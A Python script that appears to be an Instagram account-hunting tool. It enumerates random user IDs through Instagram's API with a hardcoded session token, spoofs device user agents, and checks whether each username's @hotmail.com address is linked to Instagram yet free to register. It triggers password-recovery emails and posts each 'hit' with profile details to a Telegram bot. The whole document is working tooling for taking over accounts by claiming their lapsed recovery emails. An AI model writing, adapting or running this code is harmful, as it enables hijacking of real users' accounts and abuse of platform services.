import requests, re, random, os, sys
from rich import print as g
from rich.panel import Panel
from threading import Thread, Semaphore
import webbrowser
import time
from queue import Queue

webbrowser.open('https://t.me/z3x5j')

######CHIMOX#####
R = '\033[1;31;40m'
X = '\033[1;33;40m' 
F = '\033[1;32;40m' 
C = "\033[1;97;40m" 
B = '\033[1;36;40m'
K = '\033[1;35;40m'
V = '\033[1;36;40m'
######CHIMOX#####

# Global counters
good_hot, bad_hot, good_ig, bad_ig, check, mj = 0, 0, 0, 0, 0, 0
ids = []
request_queue = Queue()  # Queue for managing requests
active_threads = Semaphore(25)  # Limit concurrent threads

# Configuration
tok = input('• {}TOKEN{} ♪ {}TELE : {}'.format(B,C,V,K))
print("\r")
iD = input('• {}ID{} ♪ {}TELE : {}'.format(B,C,V,K))
os.system('clear')

def get_random_user_agent():
    versions = ["13.1.2", "13.1.1", "13.0.5", "12.1.2", "12.0.3"]
    oss = [
        "Macintosh; Intel Mac OS X 10_15_7",
        "Macintosh; Intel Mac OS X 10_14_6",
        "iPhone; CPU iPhone OS 14_0 like Mac OS X",
        "iPhone; CPU iPhone OS 13_6 like Mac OS X"
    ]
    version = random.choice(versions)
    platform = random.choice(oss)
    return f"Mozilla/5.0 ({platform}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15 Edg/122.0.0.0"

def cookie(email):
    max_retries = 3
    for attempt in range(max_retries):
        try:
            user_agent = get_random_user_agent()
            url = 'https://signup.live.com'
            headers = {'user-agent': user_agent}
            response = requests.get(url, headers=headers, timeout=10)
            
            amsc = response.cookies.get_dict().get('amsc', '')
            match = re.search(r'"apiCanary":"(.*?)"', response.text)
            api_canary = match.group(1) if match else ''
            canary = api_canary.encode().decode('unicode_escape') if api_canary else ''
            
            if amsc and canary:
                return amsc, canary
                
        except Exception as e:
            if attempt == max_retries - 1:
                return None, None
            time.sleep(random.uniform(1, 3))

def check_hot(email):
    global good_hot, bad_hot
    
    amsc, canary = cookie(email)
    if not amsc or not canary:
        return
        
    try:
        user_agent = get_random_user_agent()
        headers = {
            'authority': 'signup.live.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'canary': canary,
            'user-agent': user_agent,
        }
        cookies = {'amsc': amsc}
        data = {'signInName': email + "@hotmail.com"}
        
        response = requests.post(
            'https://signup.live.com/API/CheckAvailableSigninNames',
            cookies=cookies,
            headers=headers,
            json=data,
            timeout=10
        )
        
        if 'isAvailable' in response.text:
            good_hot += 1
            hunting(email)
        else:
            bad_hot += 1
            
    except Exception as e:
        pass

def insta_check(email, method):
    global good_ig, bad_ig
    
    try:
        if method == 1:
            # Method 1 implementation
            app = ''.join(random.choice('1234567890') for i in range(15))
            response = requests.get('https://www.instagram.com/api/graphql', timeout=10)
            csrf = response.cookies.get_dict().get('csrftoken', '')
            
            rnd = str(random.randint(150, 999))
            user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111, 999)) + ")"
            
            data = {
                'email_or_username': email + "@hotmail.com",
                'flow': 'fxcal',
                'recaptcha_challenge_field': '',
            }
            
            headers = {
                'authority': 'www.instagram.com',
                'accept': '*/*',
                'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': user_agent,
                'viewport-width': '384',
                'x-asbd-id': '129477',
                'x-csrftoken': csrf,
                'x-ig-app-id': app,
                'x-ig-www-claim': '0',
                'x-instagram-ajax': '1007832499',
                'x-requested-with': 'XMLHttpRequest'
            }
            
            response = requests.post(
                'https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/',
                headers=headers,
                data=data,
                timeout=10
            )
            
            if 'email_or_sms_sen' in response.text:
                good_ig += 1
                check_hot(email)
            else:
                bad_ig += 1
                
        else:
            # Method 2 implementation
            rnd = str(random.randint(150, 999))
            user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986" + str(random.randint(111, 999)) + ")"
            
            url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
            headers = {
                'Host': 'www.instagram.com',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/accounts/signup/email/',
                'sec-ch-ua-full-version-list': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
                'user-agent': user_agent
            }
            data = {'email': email + "@hotmail.com"}
            
            response = requests.post(url, headers=headers, data=data, timeout=10)
            
            if 'email_is_taken' in response.text:
                good_ig += 1
                check_hot(email)
            else:
                bad_ig += 1
                
    except Exception as e:
        pass

def date_sc(Id):
    try:
        response = requests.get(f"https://mel7n.pythonanywhere.com/?id={Id}", timeout=10).json()
        return response.get('date', 'Unknown')
    except:
        return 'Unknown'

def hunting(email):
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': str(int(time.time())),
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
            'Accept-Language': 'en-GB, en-US',
            'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
        }
        
        data = {
            'signed_body': f'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"{email}"}}',
            'ig_sig_key_version': '4',
        }
        
        try:
            response = requests.post(
                'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',
                headers=headers,
                data=data,
                timeout=10
            )
            rest = response.json().get('email', False)
        except:
            rest = False
            
        try:
            info = requests.get(
                f'https://anonyig.com/api/ig/userInfoByUsername/{email}',
                timeout=10
            ).json()
        except:
            info = None
            
        # Extract user info with proper error handling
        user_info = info.get('result', {}).get('user', {}) if info else {}
        Id = user_info.get('pk_id')
        followers = user_info.get('follower_count')
        following = user_info.get('following_count')
        post = user_info.get('media_count')
        name = user_info.get('full_name')
        date = date_sc(Id) if Id else 'Unknown'
        
        hunt_message = f"""
𝙣𝙚𝙬 𝙝𝙪𝙣𝙩 𝙗𝙧𝙤 𝙜𝙤𝙤𝙙 𝙡𝙪𝙘𝙠 🇵🇸
⋘━─━𓆩CHAMSOUX𓆪‌‏━─━⋙ 
𝙣𝙖𝙢𝙚 : {name or 'Unknown'}
𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 : {email}
𝙚𝙢𝙖𝙞𝙡 : {email}@hotmail.com
𝙛𝙤𝙡𝙡𝙤𝙬𝙚𝙧𝙨 : {followers or 'Unknown'}
𝙛𝙤𝙡𝙡𝙤𝙬𝙞𝙣𝙜 : {following or 'Unknown'}
𝙞𝙙 : {Id or 'Unknown'}
𝙙𝙖𝙩𝙚 : {date}
𝙥𝙤𝙨𝙩 : {post or 'Unknown'}
𝙧𝙚𝙨𝙚𝙩 : {rest}
⋘━─━𓆩CHAMSOUX𓆪‌‏━─━⋙ 
𝙗𝙮 : @XJ_JP
        """
        
        # Send to Telegram with retry logic
        max_telegram_retries = 3
        for attempt in range(max_telegram_retries):
            try:
                requests.post(
                    f"https://api.telegram.org/bot{tok}/sendMessage",
                    params={
                        'chat_id': iD,
                        'text': hunt_message
                    },
                    timeout=10
                )
                break
            except:
                if attempt == max_telegram_retries - 1:
                    pass
                time.sleep(1)
                
        # Print to console
        nnn = random.choice([R, X, F, B, K, V])
        print(nnn)
        
        hunt2 = f"""
New Hunt Bro Good Luck  
Name : {name or 'Unknown'}
Username : {email}
Email : {email}@hotmail.com
Followers : {followers or 'Unknown'}
Following : {following or 'Unknown'}
Id : {Id or 'Unknown'}
Date : {date}
Posts : {post or 'Unknown'}
Reset : {rest}
BY : @XJ_JP
        """
        
        Hit = Panel(hunt2)
        g(Panel(Hit, title=f"Instagram | {good_hot}"))
        
    except Exception as e:
        pass

def check_email(email):
    global check
    
    # Choose method randomly
    method = random.choice([1, 2])
    insta_check(email, method)
    
    # Update console output
    b = random.randint(5, 208)
    bo = f'\x1b[38;5;{b}m'
    check += 1
    
    sys.stdout.write(f"\r   {bo}[ {C}CHIMOX ™ {bo}] {C}Good Hot : {F}{good_hot}  {C}Bad IG : {R}{bad_ig}  {C}Good IG : {X}{good_ig}  {C}{bo}Check•{check}\r")
    sys.stdout.flush()

def username_worker():
    while True:
        try:
            with active_threads:
                headers = {
                    "x-bloks-version-id": "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb",
                    "user-agent": "Instagram 275.0.0.27.98 Android (28/9; 240dpi; 720x1280; Asus; ASUS_I003DD; ASUS_I003DD; intel; en_US; 458229258)",
                    "authorization": "Bearer IGT:2:eyJkc191c2VyX2lkIjoiNTI1MjEwODYyODIiLCJzZXNzaW9uaWQiOiI1MjUyMTA4NjI4MiUzQUt4VGg2UUFzam5teVlIJTNBMjUlM0FBWWQtcXhaZGRTanNyQ3o2eW1ud0NuUGNINFpwbVd1a0JMN2p4Wm5Gb2cifQ==",
                }
                
                id = str(random.randrange(128053904, 438909537))
                data = {
                    "lsd": id,
                    "variables": '{"id":"' + id + '","render_surface":"PROFILE"}',
                    "server_timestamps": 'true',
                    "doc_id": '25313068075003303'
                }
                headers['X-Fb-Lsd'] = id
                
                response = requests.post(
                    "https://www.instagram.com/api/graphql",
                    headers=headers,
                    data=data,
                    timeout=10
                ).json()
                
                if 'data' in response and 'user' in response['data'] and 'username' in response['data']['user']:
                    username = response['data']['user']['username']
                    check_email(username)
                    
        except Exception as e:
            time.sleep(random.uniform(1, 3))
            
        # Add delay between requests to avoid rate limiting
        time.sleep(random.uniform(0.5, 2))

# Start worker threads
for i in range(25):
    Thread(target=username_worker, daemon=True).start()

# Keep main thread alive
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nShutting down gracefully...")
    sys.exit(0)
